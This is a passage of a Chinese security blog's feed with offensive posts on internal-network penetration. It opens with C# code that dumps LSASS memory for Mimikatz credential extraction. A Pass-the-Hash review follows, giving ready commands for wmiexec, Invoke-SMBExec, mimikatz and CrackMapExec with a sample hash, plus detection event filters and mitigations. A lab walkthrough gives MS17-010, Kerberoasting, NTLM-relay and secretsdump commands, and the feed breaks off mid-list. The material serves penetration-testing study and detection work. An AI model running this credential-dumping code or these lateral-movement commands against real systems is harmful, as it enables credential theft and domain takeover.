class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">[DllImport(&quot;dbghelp.dll&quot;, EntryPoint = &quot;MiniDumpWriteDump&quot;, CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]</span><br><span class="line">      static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);</span><br><span class="line"></span><br><span class="line">      public static void Minidump()</span><br><span class="line">      &#123;</span><br><span class="line">          IntPtr targetProcessHandle = IntPtr.Zero;</span><br><span class="line">          uint targetProcessId = 0;</span><br><span class="line"></span><br><span class="line">          Process targetProcess = null;</span><br><span class="line">          Process[] processes = Process.GetProcessesByName(&quot;lsass&quot;);</span><br><span class="line">          targetProcess = processes[0];</span><br><span class="line"></span><br><span class="line">          try</span><br><span class="line">          &#123;</span><br><span class="line">              targetProcessId = (uint)targetProcess.Id;</span><br><span class="line">              targetProcessHandle = targetProcess.Handle;</span><br><span class="line">          &#125;</span><br><span class="line">          catch (Exception ex)</span><br><span class="line">          &#123;</span><br><span class="line">              Console.WriteLine(String.Format(&quot;\n[X] Error getting handle to &#123;0&#125; (&#123;1&#125;): &#123;2&#125;\n&quot;, targetProcess.ProcessName, targetProcess.Id, ex.Message));</span><br><span class="line">              return;</span><br><span class="line">          &#125;</span><br><span class="line">          bool bRet = false;</span><br><span class="line"></span><br><span class="line">          string dumpDir = Program.CreateDirectory();</span><br><span class="line">          string dumpFile = String.Format(&quot;&#123;0&#125;\\lsass_pid-&#123;1&#125;.dmp&quot;, dumpDir, targetProcessId);</span><br><span class="line">          //string zipFile = String.Format(&quot;&#123;0&#125;\\lsass_pid&#123;1&#125;.bin&quot;, dumpDir, targetProcessId);</span><br><span class="line"></span><br><span class="line">          //Console.WriteLine(String.Format(&quot;\n[*] Dumping &#123;0&#125; (&#123;1&#125;) to &#123;2&#125;&quot;, targetProcess.ProcessName, targetProcess.Id, dumpFile));</span><br><span class="line"></span><br><span class="line">          using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write))</span><br><span class="line">          &#123;</span><br><span class="line">              bRet = MiniDumpWriteDump(targetProcessHandle, targetProcessId, fs.SafeFileHandle, (uint)2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h3 id="10-文件夹压缩加密"><a href="#10-文件夹压缩加密" class="headerlink" title="10) 文件夹压缩加密"></a>10) 文件夹压缩加密</h3><p><code>AES</code> 加密</p><h2 id="0x02-信息解析模块"><a href="#0x02-信息解析模块" class="headerlink" title="0x02 信息解析模块"></a>0x02 信息解析模块</h2><p> 本文所缺失的相关代码，下步更新放出。</p><h3 id="1-压缩包解密"><a href="#1-压缩包解密" class="headerlink" title="1) 压缩包解密"></a>1) 压缩包解密</h3><p><code>AES</code> 解密</p><h3 id="2-MiniDump"><a href="#2-MiniDump" class="headerlink" title="2) MiniDump"></a>2) MiniDump</h3><p>利用 <code>subtee</code> 的 <code>PELoader</code> 加载 <code>Mimikatz</code> 的自定义版本，加载 <code>minidump</code> 文件，运行 <code>sekurlsa :: logonpasswords</code> 和 <code>sekurlsa::ekeys</code></p><h3 id="3-浏览器相关"><a href="#3-浏览器相关" class="headerlink" title="3) 浏览器相关"></a>3) 浏览器相关</h3><p>解析相关 <code>sqlite</code> 文件</p><p>解析密码文件</p><h2 id="0x03-整合的相关项目列表"><a href="#0x03-整合的相关项目列表" class="headerlink" title="0x03 整合的相关项目列表"></a>0x03 整合的相关项目列表</h2><p><a href="https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/AVQuery.cna" target="_blank" rel="noopener">AVQuery.cna</a></p><p><a href="https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/EDR.cna" target="_blank" rel="noopener">EDR.cna</a></p><p><a href="https://github.com/secgroundzero/SharpAttack" target="_blank" rel="noopener">SharpAttack</a></p><p><a href="https://github.com/GhostPack/SafetyKatz" target="_blank" rel="noopener">SafetyKatz</a></p><p>这类型的开源项目，完全可以从中拓展，改写成适合自己的工具。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量。&lt;br&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="编程之道" scheme="https://rcoil.me/tags/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>Pass The Hash [ 知识回顾 ]</title>
    <link href="https://rcoil.me/2019/04/Pass%20The%20Hash/"/>
    <id>https://rcoil.me/2019/04/Pass The Hash/</id>
    <published>2019-04-04T03:14:38.000Z</published>
    <updated>2019-04-10T06:30:07.028Z</updated>
    
    <content type="html"><![CDATA[<p>这个<strong>[ 知识回顾 ]</strong>系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在横向移动中，无论是域环境还是工作组环境，hash传递常用于在获取用户hash凭证后，且在不破解的情况下，重新使用它来欺骗身份验证系统在同一网络上创建新的经过身份验证的会话。</p><h1 id="0x01-Pass-The-Hash的原理"><a href="#0x01-Pass-The-Hash的原理" class="headerlink" title="0x01  Pass The Hash的原理"></a>0x01  Pass The Hash的原理</h1><ul><li>在windows系统中，通常会使用<code>NTLM身份认证</code>。</li><li>NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)</li><li>NTLM就好像是一个令牌，有了这个令牌就相当于获取了这个令牌所属者的权限，它只是在身份验证的时候绕过了用户必须输入口令的那一步。</li><li>这个不是漏洞。</li></ul><h1 id="0x02-常用攻击方式"><a href="#0x02-常用攻击方式" class="headerlink" title="0x02 常用攻击方式"></a>0x02 常用攻击方式</h1><ul><li><p><strong>meterpreter</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">smb</span>/<span class="title">psexec_psh</span></span><br></pre></td></tr></table></figure></li><li><p><strong>wmiexec</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes e6db7544d2c6d325ca3b108f3faa626d:<span class="number">5</span>a625b04e786347908fc5f5d8a26dad5(LMHASH:NTHASH) rcoil/john@<span class="number">192.10</span><span class="number">.20</span><span class="number">.22</span> <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure></li><li><p><strong>Invoke-WMIExec</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target <span class="number">192.10</span>.<span class="number">20.22</span> -Domain rcoil.org -Username john -Hash <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -Command <span class="string">"calc.exe"</span> -verbose</span><br></pre></td></tr></table></figure></li><li><p><strong>Invoke-SMBExec</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target <span class="number">192.10</span>.<span class="number">20.22</span> -Domain rcoil.org -Username john -Hash <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -Command <span class="string">"calc.exe"</span> -verbose</span><br></pre></td></tr></table></figure></li><li><p><strong>mimikatz</strong>（Overpass-the-hash）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege：：debug</span><br><span class="line">sekurlsa::pth /user:john /domain:rcoil.org /ntlm:<span class="number">5</span>a625b04e786347908fc5f5d8a26dad5</span><br></pre></td></tr></table></figure></li><li><p><strong>CrackMapExec</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb <span class="number">192.10</span><span class="number">.20</span><span class="number">.22</span> -u john -H <span class="number">5</span>a625b04e786347908fc5f5d8a26dad5 -x whoami</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x03-如何检测"><a href="#0x03-如何检测" class="headerlink" title="0x03 如何检测"></a>0x03 如何检测</h1><p>由于Hash传递的结果为有效身份验证，因此建议检测查看涉及到的身份验证日志以确定正常用户行为与异常用户行为。这可能需要大量的数据分析，且可能导致许多误报的调查结果。</p><h2 id="1）-工作组日志事件"><a href="#1）-工作组日志事件" class="headerlink" title="1） 工作组日志事件"></a>1） 工作组日志事件</h2><ul><li><p>产生NTLM身份验证</p><p><img src="/image/Pass The Hash/blog_2019-04-03_15-47-55.png" alt="blog_2019-04-04_15-47-55.png"></p></li><li><p><strong>日志ID 4648 查看登录信息</strong></p><p><img src="/image/Pass The Hash/blog_2019-04-03_16-08-45.png" alt="blog_2019-04-03_16-08-45.png"></p><p>显示账户已经成功登陆</p></li><li><p><strong>日志ID 4624 所有用户登录事件</strong></p><p><img src="/image/Pass The Hash/blog_2019-04-03_16-12-14.png" alt="blog_2019-04-03_16-12-14.png"></p></li></ul><p>  在4624事件中，登陆类型为2，表示是一个交互式登陆。这符合使用runas登陆的方式。</p><ul><li><p><strong>日志ID 4672 分配给新登录的特权</strong></p><p><img src="/image/Pass The Hash/blog_2019-04-03_16-19-27.png" alt="blog_2019-04-03_16-19-27.png"></p></li><li><p><strong>SQLServer 机器</strong></p><p>在<code>192.168.1.104</code>机器上查看，在<code>4624事件</code>上能明确看到登陆类型为3，即网络登陆。且登陆<code>身份验证数据包</code>为NTLM。我们还将看到4672事件，因为我们利用的用户帐户是特权帐户</p></li></ul><h2 id="2）-域控日志事件"><a href="#2）-域控日志事件" class="headerlink" title="2） 域控日志事件"></a>2） 域控日志事件</h2><p>以下是我们在不使用pass-the-hash执行NTLM身份验证时看到的日志摘要。这为我们提供了正常行为的基线。</p><table><thead><tr><th><strong>Source Host</strong></th><th><strong>Target Host</strong></th><th><strong>Domain Controller</strong></th></tr></thead><tbody><tr><td>4648 - 使用显式凭据尝试登录</td><td>4624 - 帐户已成功登录。登录类型3，NTLM</td><td>4768 - 请求了Kerberos身份验证票证（TGT）</td></tr><tr><td>4624 - 帐户已成功登录。登录类型2</td><td>4672 - 分配给新登录的特权</td><td>4769 - 请求了Kerberos服务票证</td></tr><tr><td>4672 - 分配给新登录的特权</td><td></td><td>4776 - 计算机尝试验证帐户的凭据</td></tr></tbody></table><p>接下来看看<code>Pass The Hash</code>所产生的日志事件</p><h2 id="3）Pass-The-Hash事件"><a href="#3）Pass-The-Hash事件" class="headerlink" title="3）Pass The Hash事件"></a>3）Pass The Hash事件</h2><p>以下是我们在使用<code>Pass-The-Hash</code>执行NTLM身份验证时看到的日志摘要。</p><table><thead><tr><th><strong>Source Host</strong></th><th><strong>Target Host</strong></th><th><strong>Domain Controller</strong></th></tr></thead><tbody><tr><td>4648 - 使用显式凭据尝试登录</td><td>4624 - 帐户已成功登录。登录类型3，NTLM</td><td>4776 - 计算机尝试验证帐户的凭据</td></tr><tr><td>4624 - 帐户已成功登录 <strong>（登录类型= 9 </strong>,<strong>登录过程= Seclogo</strong></td><td>4672 - 分配给新登录的特权</td><td></td></tr><tr><td>4672 - 分配给新登录的特权 <strong>（登录用户，而不是模拟用户）</strong></td><td></td></tr></tbody></table><p>自定义事件过滤器，可用于显示特定信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;QueryList&gt;</span><br><span class="line">  &lt;Query Id=&quot;0&quot; Path=&quot;Security&quot;&gt;</span><br><span class="line">    &lt;Select Path=&quot;Security&quot;&gt;</span><br><span class="line">     *[System[(EventID=&apos;4624&apos;)]</span><br><span class="line">      and</span><br><span class="line">     EventData[Data[@Name=&apos;LogonType&apos;]=&apos;9&apos;]</span><br><span class="line">      and</span><br><span class="line">     EventData[Data[@Name=&apos;LogonProcessName&apos;]=&apos;seclogo&apos;]</span><br><span class="line">     and</span><br><span class="line">     EventData[Data[@Name=&apos;AuthenticationPackageName&apos;]=&apos;Negotiate&apos;]</span><br><span class="line">     ]</span><br><span class="line">     &lt;/Select&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">  &lt;Query Id=&quot;0&quot; Path=&quot;Microsoft-Windows-Sysmon/Operational&quot;&gt;</span><br><span class="line">    &lt;Select Path=&quot;Microsoft-Windows-Sysmon/Operational&quot;&gt;</span><br><span class="line">    *[System[(EventID=10)]]</span><br><span class="line">    and</span><br><span class="line">    *[EventData[Data[@Name=&apos;GrantedAccess&apos;] and (Data=&apos;0x1010&apos; or Data=&apos;0x1038&apos;)]]</span><br><span class="line">&lt;/Select&gt;</span><br><span class="line">  &lt;/Query&gt;</span><br><span class="line">&lt;/QueryList&gt;</span><br></pre></td></tr></table></figure><p>以上日志事件可自行验证。</p><p>VB代码为：&lt;    <a href="https://docs.microsoft.com/en-us/previous-versions/bb671200%28v%3dvs.90%29&gt;" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/bb671200%28v%3dvs.90%29&gt;</a></p><h2 id="4）-要想放心，还是得买买买"><a href="#4）-要想放心，还是得买买买" class="headerlink" title="4） 要想放心，还是得买买买"></a>4） 要想放心，还是得买买买</h2><p><a href="https://www.stealthbits.com/stealthdefend-product" target="_blank" rel="noopener">StealthDEFEND</a></p><p><a href="https://www.manageengine.com/products/active-directory-audit/index.html?ADAPID=101030&amp;kw=adaudit%20plus&amp;adId=7397729447&amp;gclid=CjwKCAjw-ZvlBRBbEiwANw9UWinKcfl0WJWvQu1HSdeSdhyNqxxJIGMNZ7DOoC0M_CGNX5zazdLDHxoCt8wQAvD_BwE" target="_blank" rel="noopener">Real-Time Auditing for Active Directory</a></p><p>略….</p><h2 id="5）蜜罐部署"><a href="#5）蜜罐部署" class="headerlink" title="5）蜜罐部署"></a>5）蜜罐部署</h2><p><a href="https://blog.stealthbits.com/detecting-pass-the-hash-honeypots/" target="_blank" rel="noopener">https://blog.stealthbits.com/detecting-pass-the-hash-honeypots/</a><br><a href="https://blog.stealthbits.com/implementing-detections-for-the-honeyhash/" target="_blank" rel="noopener">https://blog.stealthbits.com/implementing-detections-for-the-honeyhash/</a><br><a href="https://blog.stealthbits.com/deploying-pass-the-hash-honeypots/" target="_blank" rel="noopener">https://blog.stealthbits.com/deploying-pass-the-hash-honeypots/</a><br><a href="https://go.stealthbits.com/l/71852/2018-09-11/7vsk5x" target="_blank" rel="noopener">https://go.stealthbits.com/l/71852/2018-09-11/7vsk5x</a></p><p>略….</p><h1 id="0x04-缓解措施"><a href="#0x04-缓解措施" class="headerlink" title="0x04 缓解措施"></a>0x04 缓解措施</h1><ul><li>域管账户只能访问域控制器，且强调最少用户访问的概念。</li><li>域控制器与其余敏感系统只能从可信的脱网环境进行访问。</li><li>使用双因素身份验证。</li><li>监控身份验证与异常登陆活动相关日志。</li><li>启用LSA保护。</li><li><p>手动添加注册表，取消明文存储（<a href="https://blogs.technet.microsoft.com/srd/2014/06/05/an-overview-of-kb2871997/" target="_blank" rel="noopener">KB2871997</a>补丁）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0</span><br></pre></td></tr></table></figure></li><li><p>略….</p></li></ul><h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p><a href="https://en.wikipedia.org/wiki/Pass_the_hash" target="_blank" rel="noopener">Pass the hash</a><br><a href="https://www.anquanke.com/post/id/85995" target="_blank" rel="noopener">从hash传递攻击谈相关Windows安全机制</a><br><a href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#ESAE_BM" target="_blank" rel="noopener">Active Directory administrative tier model</a><br><a href="https://www.anquanke.com/post/id/86054" target="_blank" rel="noopener">如何检测Windows中的横向渗透攻击</a><br><a href="https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/" target="_blank" rel="noopener">HOW TO DETECT PASS-THE-HASH ATTACKS</a><br><a href="https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283" target="_blank" rel="noopener">Pass-the-hash attacks: Tools and Mitigation</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个&lt;strong&gt;[ 知识回顾 ]&lt;/strong&gt;系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内网练习（四）- 知识梳理</title>
    <link href="https://rcoil.me/2019/03/%E5%86%85%E7%BD%91%E7%BB%83%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://rcoil.me/2019/03/内网练习（四）/</id>
    <published>2019-03-11T03:13:38.000Z</published>
    <updated>2019-04-10T06:37:28.261Z</updated>
    
    <content type="html"><![CDATA[<p>环境为模拟环境，文章使用的均为公开测试工具且未涉及到各个方法的原理。</p><p>分享便是我最好的老师。   ——Micropoor</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试中，经常会遇到一些奇奇怪怪的环境。本文所采用的环境是一个红蓝对抗靶场，以贴切实际环境为出发点。</p><ul><li>目的：摸清整个内网拓扑图、获取域控内的flag文件及指定域用户手中的flag。</li><li>提示：flag{ooxx-ooxx}</li></ul><ul><li><p>初始网络拓扑</p><p><img src="/image/内网练习（四）/初始网络拓扑.png" alt="初始网络拓扑"></p></li></ul><h1 id="0x01-靶机信息收集"><a href="#0x01-靶机信息收集" class="headerlink" title="0x01 靶机信息收集"></a>0x01 靶机信息收集</h1><p>因为是模拟环境，所以初始权限为<code>win7域用户权限</code>（上了RAT–&gt;http协议）。</p><ul><li><code>DKRST011</code>的基本信息</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">机器名: DKRST011</span><br><span class="line">权限: 域用户权限(rcoil\tk001)</span><br><span class="line">系统: Windows <span class="number">7</span> Professional <span class="number">6.1</span><span class="number">.7601</span> Service Pack <span class="number">1</span> Build <span class="number">7601</span> x64</span><br><span class="line">Domain: rcoil.local</span><br><span class="line">IP地址: <span class="number">172.16</span><span class="number">.238</span><span class="number">.29</span></span><br><span class="line">杀软: McAfee(非最新版)</span><br><span class="line">补丁情况：[*<span class="number">240</span>]</span><br><span class="line">.NET版本：V1<span class="number">.0</span>、V1<span class="number">.1</span>、V2<span class="number">.0</span>、V3<span class="number">.0</span>、V3<span class="number">.5</span>、V4<span class="number">.0</span></span><br><span class="line">已有操作: 密码拖取（需要未提权）、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作</span><br><span class="line">额为信息: <span class="number">192.168</span><span class="number">.5</span><span class="number">.6</span>:<span class="number">8080</span>为内网代理服务 --&gt; Linux</span><br></pre></td></tr></table></figure><p>在收集信息的时候发现<code>TCP连接</code>都是内网连接，而RAT的进程连接也是内网，感觉网络有问题。</p><p>探测出网情况：此机器为半脱网情况，<code>dns、icmp、udp均不可出来</code>，http与https协议可出网。所有出网程序连接均为<code>192.10.22.6:8080</code>，由此初步判断为代理出网情况，且是http无限制出网。</p><p>通过对带有password等关键字眼的文件进行搜索拖取，当作储备。</p><ul><li><strong>内网存活探测</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- ICMP</span><br><span class="line">- SMB</span><br><span class="line">172.16.88.0/16</span><br><span class="line">192.168.5.0/16</span><br><span class="line">....</span><br></pre></td></tr></table></figure><h1 id="0x02-对域内信息进行获取"><a href="#0x02-对域内信息进行获取" class="headerlink" title="0x02 对域内信息进行获取"></a>0x02 对域内信息进行获取</h1><p>从全盘文件列表中可看到<code>setspn</code>是存在的，但是在我进行对域信息进行收集的时候发现已经没了（两个操作之间隔着一段时间）。为了方便操作（<code>socks代理</code>），所以使用<code>Cobalt Strike</code>上线操作。</p><h2 id="1）问题（均为RAT上运行）"><a href="#1）问题（均为RAT上运行）" class="headerlink" title="1）问题（均为RAT上运行）"></a>1）问题（均为RAT上运行）</h2><ul><li><code>Cobalt Strike</code>免杀问题；</li><li><code>powerview</code>运行无反应（powershell、C#）；</li><li><code>Bloodhound/Sharphou</code>运行无反应；</li><li><code>setspn.exe</code> 被删除。</li></ul><h2 id="2）方案"><a href="#2）方案" class="headerlink" title="2）方案"></a>2）方案</h2><ul><li>免杀<code>shellcode</code>，使用加载器运行，<a href="https://github.com/Micropoor/Micro8/blob/master/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%AC%AC%E4%BA%8C%E5%AD%A3%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%89.pdf" target="_blank" rel="noopener">例子</a> ；</li><li><code>Cobalt Strike</code>的<code>execute-assembly</code>运行本地相应C#程序；</li><li>使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener">GetUserSPNs</a> 替换<code>setspn</code>使用；<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -request -dc-ip 192.10.22.22 pentestlab.com/rcoil</span><br></pre></td></tr></table></figure></li></ul><h2 id="3）域信息的收集结果大致如下"><a href="#3）域信息的收集结果大致如下" class="headerlink" title="3）域信息的收集结果大致如下"></a>3）域信息的收集结果大致如下</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">域控：</span><br><span class="line">TTT-2_172.16.88.21_windows 2016 x64 (主域控)</span><br><span class="line">TTT-V_172.16.88.20_windows 2016 x64 (辅助域控)</span><br><span class="line">域管理员：10+</span><br><span class="line">域用户：200+</span><br><span class="line">域内机器：150+</span><br><span class="line">其他：略....</span><br></pre></td></tr></table></figure><h1 id="0x03-域控（域管理员）权限获取方法"><a href="#0x03-域控（域管理员）权限获取方法" class="headerlink" title="0x03 域控（域管理员）权限获取方法"></a>0x03 域控（域管理员）权限获取方法</h1><p>按照当前权限，梳理出一些知识点，大概可支持当前应用（知识串联）。</p><h2 id="1）-常规方法及结果"><a href="#1）-常规方法及结果" class="headerlink" title="1） 常规方法及结果"></a>1） 常规方法及结果</h2><ul><li><p><strong>组策略漏洞（GPP）</strong>–&gt; （MS14-025）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方法：</span><br><span class="line">enum4linux -a -u tk001 -p P@ssw0rd 172.16.88.21 (数据收集)</span><br><span class="line">smbclient //172.16.88.21/SYSVOL -U tk001</span><br><span class="line">或者使用msf</span><br><span class="line">auxiliary/scanner/smb/smb_enum_gpp</span><br><span class="line">[*] 结果：</span><br><span class="line">失败（其实单单看是2016 server系统就知道不会成功）</span><br></pre></td></tr></table></figure></li><li><p><strong>MS17-010</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*]msf</span><br><span class="line">auxiliary/admin/smb/ms17_010_command         </span><br><span class="line">auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">exploit/windows/smb/ms17_010_eternalblue_win8</span><br><span class="line">exploit/windows/smb/ms17_010_psexec</span><br><span class="line">[*] 结果：</span><br><span class="line">TTT-V_172.16.88.20成功执行命令</span><br></pre></td></tr></table></figure></li><li><p><strong>Kerberoasting</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*]GetUserSPNs.py</span><br><span class="line">python GetUserSPNs.py -request -dc-ip 192.10.22.22 pentestlab.com/rcoil </span><br><span class="line">关闭Kerberos预身份认证</span><br><span class="line">[*]Rubeus --&gt; https://github.com/GhostPack/Rubeus</span><br><span class="line">Rubeus.exe asreproast # 枚举所有域用户（或者指定）Roasting AS-REPs</span><br><span class="line">[*] 结果:</span><br><span class="line">失败</span><br></pre></td></tr></table></figure></li></ul><h2 id="2）-主流方法及结果"><a href="#2）-主流方法及结果" class="headerlink" title="2） 主流方法及结果"></a>2） 主流方法及结果</h2><ul><li><p><strong>基于资源约束委派</strong>(RBCD) –&gt; （未尝试）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] 条件：2012+域控制器</span><br><span class="line">[*] powermad</span><br><span class="line">[*] powerview</span><br><span class="line">[*] Rubeus</span><br><span class="line">[*] SharpAllowedToAct</span><br><span class="line">https://github.com/pkb1s/SharpAllowedToAct</span><br></pre></td></tr></table></figure></li><li><p><strong>NTLM中继攻击</strong>（未尝试）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Responder</span><br><span class="line">windows版本：https://github.com/Kevin-Robertson/Inveigh（修改函数名绕杀软等方法）</span><br><span class="line">linux版本：https://github.com/SpiderLabs/Responder</span><br><span class="line">[*] mitm6+ntlmrelayx</span><br><span class="line">https://github.com/fox-it/mitm6</span><br><span class="line">https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py</span><br><span class="line">[*] CrackMapExec</span><br><span class="line">https://github.com/byt3bl33d3r/CrackMapExec</span><br></pre></td></tr></table></figure></li><li><p><strong>Exchange</strong> （未启用Exchange）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] Privexchange</span><br><span class="line">privexchange.py -ah 172.16.238.29 TTT-2.rcoil.local -u tk001 -d rcoil.local -p P@ssw0rd  # Privexchange.py对echange进行API调用</span><br><span class="line">ntlmrelayx.py -t ldap://172.16.88.21 --escalate-user tk001 # ntlmrelayx将Exchange服务器的凭据中继到主DC，然后升级tk001的权限</span><br><span class="line">secretsdump.py rcoil/tk001@TTT-2.rcoil.local -just-dc</span><br><span class="line"></span><br><span class="line">[*] Exchange2domain --&gt; 一体化的privexchange工具</span><br><span class="line">https://github.com/Ridter/Exchange2domain</span><br></pre></td></tr></table></figure></li></ul><h2 id="3）-辅助工具"><a href="#3）-辅助工具" class="headerlink" title="3） 辅助工具"></a>3） 辅助工具</h2><ul><li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound</a> –&gt; 映射出活动目录关系</li><li><a href="https://github.com/hausec/ADAPE-Script" target="_blank" rel="noopener">ADAPE-Script </a> –&gt; AD评估和权限提升脚本</li><li><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1" target="_blank" rel="noopener">Invoke-PsUACme</a> –&gt; 绕过UAC</li><li><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">CrackMapExec</a> 